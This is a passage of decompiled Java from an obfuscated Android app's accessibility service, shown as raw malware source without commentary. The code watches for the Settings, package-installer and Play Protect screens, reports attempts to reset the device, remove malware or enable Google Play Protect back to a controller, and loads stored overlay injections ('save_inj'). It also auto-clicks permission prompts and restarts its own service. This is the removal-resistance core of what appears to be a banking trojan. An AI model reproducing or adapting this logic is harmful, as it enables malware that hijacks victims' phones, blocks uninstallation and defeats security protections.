            r6.performAction(r8)     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r6 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r9 = "Click"
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r10.<init>()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = ""
            r10.append(r11)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = r0.f399d     // Catch:{ Exception -> 0x04e2 }
            r10.append(r11)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = r10.toString()     // Catch:{ Exception -> 0x04e2 }
            r6.mo213a(r9, r10)     // Catch:{ Exception -> 0x04e2 }
            goto L_0x0397
        L_0x03c1:
            java.lang.String r2 = "30"
            boolean r2 = r3.contains(r2)     // Catch:{ Exception -> 0x04e2 }
            if (r2 == 0) goto L_0x0415
            int r2 = r3.length()     // Catch:{ Exception -> 0x04e2 }
            r6 = 30
            if (r2 <= r6) goto L_0x0415
            java.lang.String r2 = ""
            if (r3 == r2) goto L_0x0415
            java.lang.String r2 = "com.android.settings"
            boolean r1 = r1.contains(r2)     // Catch:{ Exception -> 0x04e2 }
            if (r1 == 0) goto L_0x0415
            r16.mo270a()     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = "4"
            java.lang.StringBuilder r6 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r6.<init>()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r8 = "p="
            r6.append(r8)     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r8 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.StringBuilder r9 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r9.<init>()     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r10 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = r10.mo247q(r0)     // Catch:{ Exception -> 0x04e2 }
            r9.append(r10)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = "|Attempt to reset the system|"
            r9.append(r10)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r9 = r9.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r8 = r8.mo225c(r9)     // Catch:{ Exception -> 0x04e2 }
            r6.append(r8)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r6 = r6.toString()     // Catch:{ Exception -> 0x04e2 }
            r1.mo218b(r0, r2, r6)     // Catch:{ Exception -> 0x04e2 }
        L_0x0415:
            java.lang.CharSequence r1 = r17.getPackageName()     // Catch:{ Exception -> 0x046b }
            java.lang.String r1 = r1.toString()     // Catch:{ Exception -> 0x046b }
            java.lang.String r2 = "com.google.android.packageinstaller"
            boolean r1 = r1.contains(r2)     // Catch:{ Exception -> 0x046b }
            if (r1 == 0) goto L_0x046b
            java.lang.String r1 = "android.app.alertdialog"
            boolean r1 = r4.contains(r1)     // Catch:{ Exception -> 0x046b }
            if (r1 == 0) goto L_0x046b
            boolean r1 = r3.contains(r5)     // Catch:{ Exception -> 0x046b }
            if (r1 == 0) goto L_0x046b
            r16.mo270a()     // Catch:{ Exception -> 0x046b }
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a     // Catch:{ Exception -> 0x046b }
            java.lang.String r2 = "4"
            java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x046b }
            r3.<init>()     // Catch:{ Exception -> 0x046b }
            java.lang.String r5 = "p="
            r3.append(r5)     // Catch:{ Exception -> 0x046b }
            wocwvy.czyxoxmbauu.slsa.b r5 = r0.f396a     // Catch:{ Exception -> 0x046b }
            java.lang.StringBuilder r6 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x046b }
            r6.<init>()     // Catch:{ Exception -> 0x046b }
            wocwvy.czyxoxmbauu.slsa.b r8 = r0.f396a     // Catch:{ Exception -> 0x046b }
            java.lang.String r8 = r8.mo247q(r0)     // Catch:{ Exception -> 0x046b }
            r6.append(r8)     // Catch:{ Exception -> 0x046b }
            java.lang.String r8 = "|Attempt to remove malware 1|"
            r6.append(r8)     // Catch:{ Exception -> 0x046b }
            java.lang.String r6 = r6.toString()     // Catch:{ Exception -> 0x046b }
            java.lang.String r5 = r5.mo225c(r6)     // Catch:{ Exception -> 0x046b }
            r3.append(r5)     // Catch:{ Exception -> 0x046b }
            java.lang.String r3 = r3.toString()     // Catch:{ Exception -> 0x046b }
            r1.mo218b(r0, r2, r3)     // Catch:{ Exception -> 0x046b }
        L_0x046b:
            java.lang.String r1 = "settings.verifyappssettingsactivity"
            boolean r1 = r4.contains(r1)     // Catch:{ Exception -> 0x04bb }
            if (r1 == 0) goto L_0x04bb
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a     // Catch:{ Exception -> 0x04bb }
            java.lang.String r2 = "play_protect"
            java.lang.String r1 = r1.mo234e(r0, r2)     // Catch:{ Exception -> 0x04bb }
            java.lang.String r2 = "false"
            boolean r1 = r1.equals(r2)     // Catch:{ Exception -> 0x04bb }
            if (r1 == 0) goto L_0x04bb
            r16.mo270a()     // Catch:{ Exception -> 0x04bb }
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a     // Catch:{ Exception -> 0x04bb }
            java.lang.String r2 = "4"
            java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04bb }
            r3.<init>()     // Catch:{ Exception -> 0x04bb }
            java.lang.String r4 = "p="
            r3.append(r4)     // Catch:{ Exception -> 0x04bb }
            wocwvy.czyxoxmbauu.slsa.b r4 = r0.f396a     // Catch:{ Exception -> 0x04bb }
            java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04bb }
            r5.<init>()     // Catch:{ Exception -> 0x04bb }
            wocwvy.czyxoxmbauu.slsa.b r6 = r0.f396a     // Catch:{ Exception -> 0x04bb }
            java.lang.String r6 = r6.mo247q(r0)     // Catch:{ Exception -> 0x04bb }
            r5.append(r6)     // Catch:{ Exception -> 0x04bb }
            java.lang.String r6 = "|Trying to enable <Google Play Protect>!|"
            r5.append(r6)     // Catch:{ Exception -> 0x04bb }
            java.lang.String r5 = r5.toString()     // Catch:{ Exception -> 0x04bb }
            java.lang.String r4 = r4.mo225c(r5)     // Catch:{ Exception -> 0x04bb }
            r3.append(r4)     // Catch:{ Exception -> 0x04bb }
            java.lang.String r3 = r3.toString()     // Catch:{ Exception -> 0x04bb }
            r1.mo218b(r0, r2, r3)     // Catch:{ Exception -> 0x04bb }
        L_0x04bb:
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = "save_inj"
            java.lang.String r1 = r1.mo234e(r0, r2)     // Catch:{ Exception -> 0x04e2 }
            int r2 = r1.length()     // Catch:{ Exception -> 0x04e2 }
            r3 = 5
            if (r2 <= r3) goto L_0x04cd
            r0.mo271a(r0, r1, r7)     // Catch:{ Exception -> 0x04e2 }
        L_0x04cd:
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.jtfxlnc> r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.class
            boolean r1 = r1.mo215a(r0, r2)     // Catch:{ Exception -> 0x04e2 }
            if (r1 != 0) goto L_0x04eb
            android.content.Intent r1 = new android.content.Intent     // Catch:{ Exception -> 0x04e2 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.jtfxlnc> r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.class
            r1.<init>(r0, r2)     // Catch:{ Exception -> 0x04e2 }
            r0.startService(r1)     // Catch:{ Exception -> 0x04e2 }
            return
        L_0x04e2:
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a
            java.lang.String r2 = "ERROR"
            java.lang.String r3 = "AccessibService"
            r1.mo213a(r2, r3)
        L_0x04eb:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.egxltnv.onAccessibilityEvent(android.view.accessibility.AccessibilityEvent):void");
    }

    public void onInterrupt() {
        C0034b bVar = this.f396a;
        C0033a aVar = this.f397b;
        bVar.mo213a("egxltnv", "onInterrupt");
    }

    /* access modifiers changed from: protected */
    public void onServiceConnected() {
        super.onServiceConnected();
        C0034b bVar = this.f396a;
        C0033a aVar = this.f397b;
        bVar.mo213a("egxltnv", "onServiceConnected");
        this.f398c = this.f396a.mo234e(this, "StringActivate");
        this.f399d = this.f396a.mo234e(this, "StringPermis");
        this.f400e = this.f396a.mo234e(this, "StringYes");
        this.f401f = this.f396a.mo234e(this, "uninstall1");
        this.f402g = this.f396a.mo234e(this, "uninstall2");
        this.f403h = this.f396a.mo234e(this, "vkladmin");
        this.f404i = this.f396a.mo234e(this, "straccessibility");
        this.f405j = this.f396a.mo234e(this, "straccessibility2");
        try {
            int parseInt = Integer.parseInt(this.f396a.mo234e(this, "time_start_permission")) + Integer.parseInt(this.f396a.mo234e(this, "time_work")) + 120;
            StringBuilder sb = new StringBuilder();
            sb.append("");
            sb.append(parseInt);
            this.f396a.mo233d(this, "time_start_permission", sb.toString());
        } catch (Exception unused) {
        }
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.flags = 1;
        accessibilityServiceInfo.eventTypes = -1;
        accessibilityServiceInfo.feedbackType = 16;
        setServiceInfo(accessibilityServiceInfo);
    }
}
